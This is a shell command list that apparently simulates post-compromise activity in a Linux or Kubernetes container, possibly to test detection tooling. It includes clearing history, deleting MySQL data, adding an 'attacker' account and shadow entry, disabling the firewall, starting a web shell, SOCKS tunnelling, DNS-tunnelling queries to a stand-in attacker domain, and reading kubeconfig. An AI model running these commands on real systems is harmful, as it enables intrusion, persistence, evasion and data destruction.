## Create namespace
unshare   # -u command

# Clear history
history -c

# Use SOCKS to connect to a remote server
apt-get update 
apt-get -y install ssh
ssh -D 22 1.2.3.4

## Run SSH server
apt-get update 
apt-get -y install ssh
service ssh start

# Stop upgrade service
systemctl disable apt-daily-upgrade.timer

## rm important files
mkdir -p /var/lib/mysql/
rm -rf /var/lib/mysql/

# nohup
echo "echo Attack World!" > /tmp/attack.sh
chmod +x /tmp/attack.sh
nohup /tmp/attack.sh >/dev/null 2>&1 

# useradd
useradd -r attacker
echo -e "iamin\niamin" | passwd attacker

# download and run file
cd /tmp
curl -LO https://dl.k8s.io/release/v1.26.0/bin/linux/amd64/kubectl && chmod +x ./kubectl && ./kubectl version --client

# disable firewall
ufw disable

# dns tunneling
apt update
apt install -y dnsutils
dig sdfuaelfiuhtgdfsdfkjsdfvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgddfdfkjsdfvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgdfsdfkjsdfvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgdfsgdfgfddvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgdfsdfkjsdfvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgdfdfgdgdfgvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgdfsdfkjtttvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtgdfrrrkjsdfvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something
dig sdfuaelfiuhtewqsdfkjsdfvsdfvstgdfgsegdsfgfsefgsdfgfedfdsgsdf.attackerdomain.something


## copy timestamp
cp /bin/bash /tmp/bash
touch /tmp/bash -r /bin/bash

## Call Kubernetes API
curl -k "https://$KUBERNETES_SERVICE_HOST"/api/v1/pods

# Add to shadow file
echo 'attacker:$y$j9T$3inp.lOKPaTedB4c9cmlg/$rneo3NpwtsdMqHWOWXnRMQaWTNWYydqZuxqJqwdWZ27:19426::::::' >> /etc/shadow

# web shell
apt update
apt install -y shellinabox
service shellinabox start

# try to access kubeconfig
cat /etc/kubernetes/admin.conf
